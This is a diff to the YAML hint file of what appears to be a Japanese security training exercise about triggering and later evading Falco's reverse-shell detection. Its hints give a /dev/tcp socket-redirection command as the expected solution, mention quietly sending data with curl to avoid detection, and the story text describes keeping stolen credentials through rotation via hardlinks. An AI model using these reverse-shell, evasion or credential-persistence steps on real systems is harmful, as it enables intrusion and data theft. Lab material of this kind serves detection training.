@@ -22,7 +22,7 @@ steps:
 hints:
   - 古典的 reverse shell は「ネットワーク socket を標準入出力に繋ぐ」ことで成立する。Falco はその繋ぐ瞬間 (dup 系 syscall) を見ている。
   - bash の /dev/tcp/<host>/<port> で TCP socket を開き、fd リダイレクトで stdout/stdin に dup2 すると発火する。接続が成立する宛先が必要。
-  - "想定解: bash -c 'exec 1<>/dev/tcp/8.8.8.8/53' — <> が socket fd を stdout に dup する瞬間に発火。Mission 10 では逆に dup を避け curl で静かに送る。"
+  - "想定解: bash -c 'exec 1<>/dev/tcp/8.8.8.8/53' — <> が socket fd を stdout に dup する瞬間に発火。この先の回避ミッションでは逆に dup を避け curl で静かに送る。"
 bridge: >-
   C2 は開通した。あとは戦利品を運び出すだけ — だが運用側が credential を rotate すれば
   盗んだ鍵は無効になる。rotate されても中身が残る自分用のコピーを、hardlink で先に確保しておく。
